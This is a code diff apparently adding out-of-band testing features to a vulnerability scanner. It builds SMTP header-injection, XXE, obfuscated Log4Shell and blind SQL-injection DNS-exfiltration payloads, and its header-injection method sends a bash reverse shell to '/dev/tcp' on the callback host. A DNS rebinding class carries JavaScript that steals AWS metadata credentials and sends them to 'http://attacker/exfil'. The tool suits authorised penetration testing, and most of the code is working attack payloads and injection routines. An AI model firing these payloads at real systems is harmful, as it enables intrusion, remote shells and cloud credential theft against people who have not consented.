@@ -748,3 +748,672 @@ def stop_global_oast_poller() -> None:
 def get_oast_poller() -> Optional[OASTPollerThread]:
     """Get the current global OAST poller."""
     return _GLOBAL_OAST_POLLER
+
+# ===========================================================================
+# ADIM 10 — OAST / Out-of-Band: Multi-Protocol Channels & Advanced Features
+# ===========================================================================
+import base64 as _b64
+import socket as _socket
+import struct as _struct
+
+
+# ---------------------------------------------------------------------------
+# 1. Multi-Protocol OOB Channel Payload Generators
+# ---------------------------------------------------------------------------
+
+class OASTSMTPChannel:
+    """
+    SMTP header-injection OOB payloads.
+    Injects OOB domain into To/Cc/From/Reply-To/Return-Path fields.
+    Detects SMTP callbacks via interactsh SMTP protocol listener.
+    """
+
+    _HEADERS = ["To", "Cc", "Bcc", "From", "Reply-To", "Return-Path", "X-Forwarded-To"]
+
+    def __init__(self, oob_domain: str):
+        self.oob_domain = oob_domain.strip(".")
+
+    def payloads(self, token: str) -> Dict[str, str]:
+        """Returns {header_name: injected_value} for each SMTP header."""
+        addr = f"{token}@{self.oob_domain}"
+        return {h: addr for h in self._HEADERS}
+
+    def smtp_injection_payloads(self, token: str) -> List[str]:
+        """CRLF + To: style injection strings for form fields."""
+        addr = f"{token}@{self.oob_domain}"
+        return [
+            f"\r\nTo: {addr}",
+            f"\nCc: {addr}",
+            f"%0d%0aTo: {addr}",
+            f"%0aCc: {addr}",
+            f"victim@example.com%0aBcc: {addr}",
+            f"victim@example.com\r\nReply-To: {addr}",
+        ]
+
+
+class OASTFTPChannel:
+    """
+    FTP OOB payload generator.
+    Used in XXE / SSRF / blind injection contexts.
+    """
+
+    def __init__(self, oob_domain: str):
+        self.oob_domain = oob_domain.strip(".")
+
+    def payloads(self, token: str) -> List[str]:
+        host = f"{token}.{self.oob_domain}"
+        return [
+            f"ftp://{host}/",
+            f"ftp://{host}/{token}",
+            f"ftp://anonymous:anonymous@{host}/",
+        ]
+
+    def xxe_entity(self, token: str) -> str:
+        host = f"{token}.{self.oob_domain}"
+        return (
+            '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM '
+            f'"ftp://{host}/"> ]><foo>&xxe;</foo>'
+        )
+
+
+class OASTLDAPChannel:
+    """
+    LDAP OOB payload generator.
+    Used for Log4Shell-style injection (${jndi:ldap://...}).
+    """
+
+    _LOG4SHELL_PREFIXES = [
+        "${jndi:ldap://",
+        "${${lower:j}ndi:ldap://",
+        "${${::-j}${::-n}${::-d}${::-i}:ldap://",
+        "${j${lower:n}di:ldap://",
+        "%24%7Bjndi%3Aldap%3A%2F%2F",
+        "#{jndi:ldap://",
+    ]
+
+    def __init__(self, oob_domain: str):
+        self.oob_domain = oob_domain.strip(".")
+
+    def payloads(self, token: str) -> List[str]:
+        host = f"{token}.{self.oob_domain}"
+        return [f"ldap://{host}/a", f"ldaps://{host}/a", f"rmi://{host}/a"]
+
+    def log4shell_payloads(self, token: str) -> List[str]:
+        host = f"{token}.{self.oob_domain}"
+        return [f"{p}{host}/a}}" for p in self._LOG4SHELL_PREFIXES]
+
+
+class OASTMultiProtocolProber:
+    """
+    Aggregates DNS/HTTP/SMTP/FTP/LDAP OOB payload channels into a single
+    interface and injects them across multiple injection surfaces.
+
+    SOLID: Single Responsibility — only payload generation + injection,
+    not correlation (delegated to OASTCorrelationEngine).
+    """
+
+    def __init__(
+        self,
+        oab_client,  # OASTClient or IOSATClient
+        oob_domain: str = "",
+        session=None,
+    ):
+        domain = oob_domain or getattr(getattr(oab_client, "cfg", None), "root_domain", "") or ""
+        self.oob_domain = domain.strip(".")
+        self._oast = oab_client
+        self._session = session
+        self._smtp = OASTSMTPChannel(self.oob_domain)
+        self._ftp = OASTFTPChannel(self.oob_domain)
+        self._ldap = OASTLDAPChannel(self.oob_domain)
+
+    def all_payloads(self, token: str) -> Dict[str, List[str]]:
+        """Returns all protocol payloads keyed by protocol name."""
+        host = f"{token}.{self.oob_domain}"
+        return {
+            "dns": [host],
+            "http": [f"http://{host}/", f"https://{host}/"],
+            "smtp": self._smtp.smtp_injection_payloads(token),
+            "ftp": self._ftp.payloads(token),
+            "ldap": self._ldap.payloads(token),
+            "log4shell": self._ldap.log4shell_payloads(token),
+            "xxe_ftp": [self._ftp.xxe_entity(token)],
+        }
+
+    def inject_header(self, url: str, token: str) -> List[Dict[str, Any]]:
+        """Inject OOB payloads into common HTTP headers."""
+        if not self._session:
+            return []
+        results = []
+        host = f"{token}.{self.oob_domain}"
+        headers_to_inject = {
+            "X-Forwarded-For": host,
+            "X-Forwarded-Host": host,
+            "Referer": f"http://{host}/",
+            "User-Agent": f"(){{}};/bin/bash -i >& /dev/tcp/{host}/80 0>&1",
+            "X-Custom-IP-Authorization": host,
+            "X-Original-URL": f"http://{host}/",
+            "True-Client-IP": host,
+        }
+        for hdr, val in headers_to_inject.items():
+            try:
+                import requests
+                r = requests.get(url, headers={hdr: val}, timeout=6, verify=False)
+                results.append({"header": hdr, "value": val, "status": r.status_code})
+            except Exception:
+                pass
+        return results
+
+    def inject_log4shell(self, url: str, token: str) -> List[Dict[str, Any]]:
+        """Inject Log4Shell payloads into HTTP headers."""
+        if not self._session:
+            return []
+        results = []
+        payloads = self._ldap.log4shell_payloads(token)
+        inject_headers = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer", "Accept-Language"]
+        import requests
+        for header in inject_headers:
+            for payload in payloads[:2]:  # first 2 variants per header
+                try:
+                    r = requests.get(url, headers={header: payload}, timeout=6, verify=False)
+                    results.append({"header": header, "payload": payload, "status": r.status_code})
+                except Exception:
+                    pass
+        return results
+
+
+# ---------------------------------------------------------------------------
+# 2. OOB Correlation Engine
+# ---------------------------------------------------------------------------
+
+class OASTCorrelationEngine:
+    """
+    Maps injection tokens → (payload, endpoint, param, inject_ts)
+    and correlates with OAST callback events to produce confirmed findings.
+
+    Provides timing analysis: latency between injection and callback.
+    """
+
+    def __init__(self):
+        self._injections: Dict[str, Dict[str, Any]] = {}
+        self._events: List[Dict[str, Any]] = []
+        self._lock = threading.Lock()
+
+    # -- Registration API --
+
+    def record_injection(
+        self,
+        token: str,
+        *,
+        payload: str = "",
+        endpoint: str = "",
+        param: str = "",
+        protocol: str = "http",
+        extra: Optional[Dict[str, Any]] = None,
+    ) -> None:
+        with self._lock:
+            self._injections[token] = {
+                "token": token,
+                "payload": payload,
+                "endpoint": endpoint,
+                "param": param,
+                "protocol": protocol,
+                "inject_ts": time.time(),
+                **(extra or {}),
+            }
+
+    # -- Correlation API --
+
+    def correlate_event(self, event: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Match an OAST event to a recorded injection. Returns enriched finding or None."""
+        with self._lock:
+            tok = str(
+                event.get("token")
+                or event.get("unique-id")
+                or event.get("unique_id")
+                or ""
+            )
+            injection = self._injections.get(tok)
+            if not injection:
+                # Try substring search in raw request
+                raw = str(event.get("raw-request") or event.get("request") or "")
+                for t, inj in self._injections.items():
+                    if t and t in raw:
+                        tok, injection = t, inj
+                        break
+            if not injection:
+                return None
+
+            callback_ts = time.time()
+            inject_ts = injection.get("inject_ts", callback_ts)
+            latency_ms = round((callback_ts - inject_ts) * 1000, 1)
+
+            finding = {
+                **injection,
+                "verified": True,
+                "oast_event": event,
+                "callback_ts": callback_ts,
+                "latency_ms": latency_ms,
+                "protocol_detected": event.get("protocol", injection.get("protocol", "unknown")),
+                "remote_address": event.get("remote-address", event.get("remote_address", "")),
+                "severity": "Yüksek",
+                "confidence": 1.0,
+                "confidence_label": "Confirmed",
+            }
+            self._events.append(finding)
+            return finding
+
+    def correlate_batch(self, events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        return [f for ev in events for f in [self.correlate_event(ev)] if f]
+
+    def get_unmatched_injections(self, min_age_s: float = 30.0) -> List[Dict[str, Any]]:
+        """Return injections with no callback yet (potential false negatives)."""
+        now = time.time()
+        matched_tokens = {ev["token"] for ev in self._events}
+        with self._lock:
+            return [
+                inj for tok, inj in self._injections.items()
+                if tok not in matched_tokens and (now - inj.get("inject_ts", now)) >= min_age_s
+            ]
+
+    def summary(self) -> Dict[str, Any]:
+        with self._lock:
+            return {
+                "injections_total": len(self._injections),
+                "callbacks_received": len(self._events),
+                "avg_latency_ms": (
+                    round(sum(e.get("latency_ms", 0) for e in self._events) / len(self._events), 1)
+                    if self._events else None
+                ),
+            }
+
+
+# ---------------------------------------------------------------------------
+# 3. OAST Timing Analyzer
+# ---------------------------------------------------------------------------
+
+class OASTTimingAnalyzer:
+    """
+    Statistical timing analysis of OOB callbacks.
+    Useful for: blind SQLi timing detection, DNS exfil latency, WAF detection.
+    """
+
+    def __init__(self):
+        self._records: List[Dict[str, Any]] = []
+
+    def record(self, token: str, inject_ts: float, callback_ts: float, protocol: str = "dns") -> None:
+        latency_ms = round((callback_ts - inject_ts) * 1000, 1)
+        self._records.append({
+            "token": token, "inject_ts": inject_ts,
+            "callback_ts": callback_ts, "latency_ms": latency_ms,
+            "protocol": protocol,
+        })
+
+    def analyze(self) -> Dict[str, Any]:
+        if not self._records:
+            return {"samples": 0}
+        latencies = [r["latency_ms"] for r in self._records]
+        latencies_sorted = sorted(latencies)
+        n = len(latencies_sorted)
+        mean_ms = sum(latencies_sorted) / n
+        median_ms = latencies_sorted[n // 2]
+        p95_ms = latencies_sorted[int(n * 0.95)]
+        variance = sum((x - mean_ms) ** 2 for x in latencies_sorted) / n
+        stddev = variance ** 0.5
+        by_proto: Dict[str, List[float]] = {}
+        for r in self._records:
+            by_proto.setdefault(r["protocol"], []).append(r["latency_ms"])
+        return {
+            "samples": n,
+            "min_ms": latencies_sorted[0],
+            "max_ms": latencies_sorted[-1],
+            "mean_ms": round(mean_ms, 1),
+            "median_ms": round(median_ms, 1),
+            "p95_ms": round(p95_ms, 1),
+            "stddev_ms": round(stddev, 1),
+            "by_protocol": {k: round(sum(v) / len(v), 1) for k, v in by_proto.items()},
+            "interpretation": (
+                "Anormal gecikme — WAF/güvenlik duvarı filtrelemesi olabilir"
+                if stddev > 5000
+                else "Normal OOB gecikme örüntüsü"
+            ),
+        }
+
+
+# ---------------------------------------------------------------------------
+# 4. DNS Rebinding Attacker
+# ---------------------------------------------------------------------------
+
+class DNSRebindingAttacker:
+    """
+    DNS rebinding attack automation.
+
+    Phase 1: Victim browser resolves attacker domain → attacker IP (serves JS)
+    Phase 2: DNS TTL expires; attacker domain now resolves → target internal IP
+    Phase 3: Browser JS makes same-origin requests to internal service
+
+    Generates attack payloads and instructions for common rebinding services.
+    """
+
+    _REBINDING_SERVICES = [
+        "rbndr.us",       # {hex_ip_a}.{hex_ip_b}.rbndr.us alternates A/B
+        "1u.ms",          # {ip_a}-{ip_b}.1u.ms
+        "rebind.it",      # manual
+        "nip.io",         # direct IP embed (not rebinding, but useful)
+        "sslip.io",       # direct IP embed with SSL
+    ]
+
+    def __init__(self, attacker_ip: str = "", target_ip: str = "127.0.0.1"):
+        self.attacker_ip = attacker_ip or "ATTACKER_IP"
+        self.target_ip = target_ip
+
+    def _ip_to_hex(self, ip: str) -> str:
+        try:
+            packed = _socket.inet_aton(ip)
+            return packed.hex()
+        except Exception:
+            return ip.replace(".", "-")
+
+    def rbndr_us_domain(self) -> str:
+        """Generate rbndr.us domain that alternates between attacker and target."""
+        a_hex = self._ip_to_hex(self.attacker_ip)
+        b_hex = self._ip_to_hex(self.target_ip)
+        return f"{a_hex}.{b_hex}.rbndr.us"
+
+    def one_u_ms_domain(self) -> str:
+        """Generate 1u.ms domain."""
+        a = self.attacker_ip.replace(".", "-")
+        b = self.target_ip.replace(".", "-")
+        return f"{a}-{b}.1u.ms"
+
+    def attack_payloads(self, internal_port: int = 80) -> List[Dict[str, Any]]:
+        """Generate DNS rebinding attack instructions."""
+        rbndr = self.rbndr_us_domain()
+        one_u = self.one_u_ms_domain()
+        return [
+            {
+                "service": "rbndr.us",
+                "domain": rbndr,
+                "attack_url": f"http://{rbndr}:{internal_port}/",
+                "description": "Alternates DNS between attacker and target IP (low TTL)",
+                "js_payload": (
+                    f"fetch('http://{rbndr}:{internal_port}/api/v1/metadata')"
+                    f".then(r=>r.text()).then(d=>fetch('http://attacker/exfil?d='+btoa(d)))"
+                ),
+            },
+            {
+                "service": "1u.ms",
+                "domain": one_u,
+                "attack_url": f"http://{one_u}:{internal_port}/",
+                "description": "Round-robin DNS rebinding via 1u.ms",
+                "js_payload": (
+                    f"fetch('http://{one_u}:{internal_port}/')"
+                    f".then(r=>r.text()).then(d=>navigator.sendBeacon('http://attacker/c',d))"
+                ),
+            },
+        ]
+
+    def cloud_metadata_attack(self) -> Dict[str, Any]:
+        """DNS rebinding targeting AWS IMDSv1 metadata (169.254.169.254)."""
+        self.target_ip = "169.254.169.254"
+        rbndr = self.rbndr_us_domain()
+        return {
+            "type": "dns_rebinding_aws_imds",
+            "domain": rbndr,
+            "target": "169.254.169.254",
+            "attack_url": f"http://{rbndr}/latest/meta-data/",
+            "js_exfil": (
+                f"fetch('http://{rbndr}/latest/meta-data/iam/security-credentials/')"
+                ".then(r=>r.text()).then(role=>fetch(`http://"
+                f"{rbndr}/latest/meta-data/iam/security-credentials/${{role}}`)"
+                ".then(r=>r.text()).then(creds=>fetch('http://attacker/exfil?c='+btoa(creds))))"
+            ),
+            "severity": "Kritik",
+            "description": "DNS rebinding to extract AWS IMDSv1 credentials from browser",
+        }
+
+
+# ---------------------------------------------------------------------------
+# 5. OOB Data Exfiltrator (DNS TXT base32/hex)
+# ---------------------------------------------------------------------------
+
+class OASTDataExfiltrator:
+    """
+    DNS TXT-based out-of-band data exfiltration.
+
+    Encodes arbitrary data as base32 or hex chunks and generates
+    DNS query sequences that leak data to an OOB DNS listener.
+
+    Encoding: base32 (RFC 4648, DNS-safe alphabet) or hex.
+    Each DNS label: max 63 chars. Total FQDN: max 253 chars.
+    """
+
+    _MAX_LABEL = 60   # conservative (leave room for index prefix)
+    _MAX_FQDN = 240   # conservative
+
+    def __init__(self, oob_domain: str, encoding: str = "base32"):
+        self.oob_domain = oob_domain.strip(".")
+        self.encoding = encoding.lower()
+
+    def encode(self, data: bytes) -> str:
+        if self.encoding == "base32":
+            return _b64.b32encode(data).decode("ascii").lower().rstrip("=")
+        elif self.encoding == "hex":
+            return data.hex()
+        else:
+            return _b64.b64encode(data).decode("ascii").replace("+", "-").replace("/", "_").rstrip("=")
+
+    def decode(self, encoded: str) -> bytes:
+        if self.encoding == "base32":
+            padded = encoded.upper() + "=" * (-len(encoded) % 8)
+            return _b64.b32decode(padded)
+        elif self.encoding == "hex":
+            return bytes.fromhex(encoded)
+        else:
+            padded = encoded.replace("-", "+").replace("_", "/") + "==="
+            return _b64.b64decode(padded[:len(padded) - len(padded) % 4])
+
+    def build_dns_exfil_queries(self, data: bytes, token: str) -> List[str]:
+        """
+        Splits data into DNS-label-sized chunks.
+        Each query: {index}.{chunk}.{token}.{oob_domain}
+        """
+        encoded = self.encode(data)
+        chunk_size = self._MAX_LABEL - 6  # room for "N." prefix + dot
+        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
+        queries = []
+        total = len(chunks)
+        for i, chunk in enumerate(chunks):
+            label = f"{i:02d}of{total:02d}.{chunk}.{token}.{self.oob_domain}"
+            if len(label) <= self._MAX_FQDN:
+                queries.append(label)
+        return queries
+
+    def decode_received_chunks(self, queries: List[str]) -> bytes:
+        """Reconstruct data from received DNS queries (sorted by index)."""
+        chunks: Dict[int, str] = {}
+        for q in queries:
+            parts = q.split(".")
+            if len(parts) >= 3:
+                idx_part = parts[0]
+                chunk = parts[1]
+                try:
+                    idx = int(idx_part.split("of")[0])
+                    chunks[idx] = chunk
+                except ValueError:
+                    pass
+        ordered = [chunks[k] for k in sorted(chunks)]
+        return self.decode("".join(ordered))
+
+    def sqli_dns_exfil_payload(self, column: str, table: str, token: str) -> Dict[str, str]:
+        """Generate DNS exfil payloads for blind SQLi (MySQL / MSSQL / PostgreSQL)."""
+        host = f"{token}.{self.oob_domain}"
+        return {
+            "mysql": (
+                f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\', ({column} FROM {table} LIMIT 1), "
+                f"'.{host}\\\\x')))-- -"
+            ),
+            "mssql": (
+                f"'; DECLARE @r NVARCHAR(MAX)=({column} FROM {table}); "
+                f"EXEC master..xp_dirtree '\\\\'+@r+'.{host}\\x'-- -"
+            ),
+            "oracle": (
+                f"' AND (SELECT UTL_HTTP.REQUEST('http://'||({column} FROM {table})||'.{host}/') FROM DUAL)-- -"
+            ),
+        }
+
+
+# ---------------------------------------------------------------------------
+# 6. Scanner Integration Mixin
+# ---------------------------------------------------------------------------
+
+class OASTScannerMixin:
+    """
+    Mixin for BaseScanner subclasses to easily use OAST OOB callbacks.
+
+    Usage in scanner:
+        class MyScanner(OASTScannerMixin, BaseScanner):
+            def run(self, target, **kwargs):
+                tok = self.oast_new_token(endpoint=target, param="q")
+                payloads = self.oast_payloads(tok)
+                # inject payloads["http"][0] or payloads["dns"][0]
+                ...
+                events = self.oast_poll(tok, wait=15)
+                findings = self.oast_correlate(events)
+    """
+
+    # Expected to be set by the owning Scanner or injected via __init__
+    _oast_client: Optional["OASTClient"] = None
+    _oast_correlation: Optional[OASTCorrelationEngine] = None
+
+    def _ensure_oast(self) -> bool:
+        if self._oast_client is None:
+            # Try to grab global poller client
+            poller = get_oast_poller()
+            if poller:
+                self._oast_client = poller._client
+        if self._oast_correlation is None:
+            self._oast_correlation = OASTCorrelationEngine()
+        return self._oast_client is not None
+
+    def oast_new_token(
+        self,
+        endpoint: str = "",
+        param: str = "",
+        protocol: str = "http",
+        payload: str = "",
+    ) -> str:
+        tok = gen_token("ws")
+        if self._oast_correlation is None:
+            self._oast_correlation = OASTCorrelationEngine()
+        self._oast_correlation.record_injection(
+            tok, endpoint=endpoint, param=param, protocol=protocol, payload=payload
+        )
+        return tok
+
+    def oast_payloads(self, token: str) -> Dict[str, List[str]]:
+        """Return all protocol payloads for a given token."""
+        if not self._ensure_oast():
+            domain = "oast.example.com"
+        else:
+            cfg = getattr(self._oast_client, "cfg", None)
+            domain = getattr(cfg, "root_domain", "") if cfg else ""
+            domain = domain or "oast.example.com"
+        mp = OASTMultiProtocolProber(self._oast_client, oob_domain=domain)
+        return mp.all_payloads(token)
+
+    def oast_poll(self, token: str, wait: float = 15.0) -> List[Dict[str, Any]]:
+        """Poll for OAST events for the given token."""
+        if not self._ensure_oast():
+            return []
+        try:
+            return poll_events_sync(self._oast_client, [token], timeout=int(wait + 5))
+        except Exception:
+            return []
+
+    def oast_correlate(self, events: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Correlate polled events to injections. Returns confirmed findings."""
+        if self._oast_correlation is None:
+            return []
+        return self._oast_correlation.correlate_batch(events)
+
+    def oast_summary(self) -> Dict[str, Any]:
+        if self._oast_correlation is None:
+            return {}
+        return self._oast_correlation.summary()
+
+
+# ---------------------------------------------------------------------------
+# 7. Enhanced CollaboratorClient (Burp Collaborator compat)
+# ---------------------------------------------------------------------------
+
+class EnhancedCollaboratorClient(_BaseOSAT, IOSATClient):
+    """
+    Burp Collaborator-compatible OAST client.
+    Polls {api_url}/burpresults?biid={biid} for DNS/HTTP/SMTP interactions.
+    Also supports OAST.pro and other Collaborator-compatible servers.
+    """
+
+    def __init__(self, cfg: OSATConfig):
+        super().__init__(cfg)
+        self._biid: Optional[str] = None
+        self._registered = False
+
+    async def _ensure_registered(self) -> None:
+        if self._registered:
+            return
+        base = (self.cfg.api_url or "").rstrip("/")
+        if not base:
+            return
+        try:
+            r = await self._client.get(f"{base}/burpresults", timeout=httpx.Timeout(10))
+            if r.status_code == 200:
+                data = r.json() or {}
+                self._biid = str(data.get("biid") or data.get("id") or uuid.uuid4().hex[:16])
+                self._registered = True
+        except Exception as e:
+            _logger.debug(f"[Collaborator] Registration failed: {e}")
+            self._biid = uuid.uuid4().hex[:16]
+            self._registered = True
+
+    async def new_token(self) -> str:
+        await self._ensure_registered()
+        sub = uuid.uuid4().hex[:8]
+        if self._biid:
+            return f"{sub}.{self._biid}"
+        return gen_token("collab")
+
+    def payloads_for(self, token: str) -> Dict[str, List[str]]:
+        base = (self.cfg.api_url or "").rstrip("/")
+        domain = base.replace("https://", "").replace("http://", "") or self.cfg.root_domain
+        return build_payloads(domain, token)
+
+    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
+        await self._ensure_registered()
+        base = (self.cfg.api_url or "").rstrip("/")
+        if not base or not self._biid:
+            return []
+        tokens = set(interested_tokens or [])
+        found: List[Dict[str, Any]] = []
+        try:
+            r = await self._client.get(
+                f"{base}/burpresults",
+                params={"biid": self._biid},
+                timeout=httpx.Timeout(15),
+            )
+            if r.status_code == 200:
+                data = r.json() or {}
+                for ev in data.get("responses") or []:
+                    client_data = str(ev.get("clientAddress") or "")
+                    type_ = str(ev.get("type") or "dns").lower()
+                    tok_match = next((t for t in tokens if t in str(ev)), "")
+                    if tok_match:
+                        found.append({
+                            "token": tok_match,
+                            "protocol": type_,
+                            "remote_address": client_data,
+                            "ts": ev.get("time"),
+                            "raw": ev,
+                        })
+        except Exception as e:
+            _logger.debug(f"[Collaborator] Poll error: {e}")
+        return found
